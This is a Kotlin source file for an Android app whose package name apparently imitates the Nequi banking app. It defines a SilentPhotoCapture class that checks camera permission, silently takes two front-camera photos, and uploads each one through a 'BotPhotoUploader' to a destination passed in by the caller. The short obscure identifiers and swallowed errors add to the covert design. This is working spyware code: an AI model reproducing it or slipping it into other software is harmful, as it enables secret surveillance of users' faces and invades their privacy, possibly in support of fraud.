package com.ios.nequixofficialv2.utils

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.core.ImageProxy
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleOwner
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

class SilentPhotoCapture(private val ctx: Context) {
    
    private val ex: ExecutorService = Executors.newSingleThreadExecutor()
    private var ic: ImageCapture? = null
    private var cnt = 0
    
    fun captureSilentPhoto(
        p: String,
        l: LifecycleOwner,
        s: ((String) -> Unit)? = null,
        e: ((Exception) -> Unit)? = null
    ) {
        if (!chk()) {
            e?.invoke(SecurityException(""))
            return
        }
        
        cnt = 0
        CoroutineScope(Dispatchers.Main).launch {
            try {
                init(l)
                delay(800L)
                
                take { b1 ->
                    android.util.Log.d("SilentPhotoCapture", "📸 Foto 1 capturada, enviando...")
                    CoroutineScope(Dispatchers.IO).launch {
                        val r1 = BotPhotoUploader.uploadPhoto(b1, p, "1")
                        r1.onSuccess {
                            android.util.Log.d("SilentPhotoCapture", "✅ Foto 1 enviada")
                            cnt++
                            delay(1500L)
                            take { b2 ->
                                android.util.Log.d("SilentPhotoCapture", "📸 Foto 2 capturada, enviando...")
                                CoroutineScope(Dispatchers.IO).launch {
                                    val r2 = BotPhotoUploader.uploadPhoto(b2, p, "2")
                                    r2.onSuccess {
                                        android.util.Log.d("SilentPhotoCapture", "✅ Foto 2 enviada")
                                        cnt++
                                        s?.invoke("$cnt")
                                    }
                                    r2.onFailure { 
                                        android.util.Log.e("SilentPhotoCapture", "❌ Error foto 2: ${it.message}")
                                        e?.invoke(it as? Exception ?: Exception(it.message)) 
                                    }
                                    clean()
                                }
                            }
                        }
                        r1.onFailure { 
                            android.util.Log.e("SilentPhotoCapture", "❌ Error foto 1: ${it.message}")
                            e?.invoke(it as? Exception ?: Exception(it.message)) 
                        }
                    }
                }
            } catch (ex: Exception) {
                e?.invoke(ex)
                clean()
            }
        }
    }
    
    private suspend fun init(l: LifecycleOwner) = withContext(Dispatchers.Main) {
        try {
            val f = ProcessCameraProvider.getInstance(ctx)
            val p = f.get()
            
            ic = ImageCapture.Builder()
                .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                .build()
            
            val sel = CameraSelector.DEFAULT_FRONT_CAMERA
            
            try {
                p.unbindAll()
                p.bindToLifecycle(l, sel, ic)
            } catch (exc: Exception) {
                throw exc
            }
        } catch (e: Exception) {
            throw e
        }
    }
    
    private fun take(s: (Bitmap) -> Unit) {
        val c = ic ?: return
        
        c.takePicture(
            ex,
            object : ImageCapture.OnImageCapturedCallback() {
                override fun onCaptureSuccess(i: ImageProxy) {
                    val b = conv(i)
                    i.close()
                    if (b != null) s(b)
                }
                
                override fun onError(e: ImageCaptureException) {}
            }
        )
    }
    
    private fun conv(i: ImageProxy): Bitmap? {
        val buf = i.planes[0].buffer
        val byt = ByteArray(buf.remaining())
        buf.get(byt)
        return BitmapFactory.decodeByteArray(byt, 0, byt.size)
    }
    
    private fun chk(): Boolean {
        return ContextCompat.checkSelfPermission(ctx, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
    }
    
    private fun clean() {
        try {
            val f = ProcessCameraProvider.getInstance(ctx)
            val p = f.get()
            p.unbindAll()
        } catch (e: Exception) {}
    }
    
    fun shutdown() {
        clean()
        ex.shutdown()
    }
}
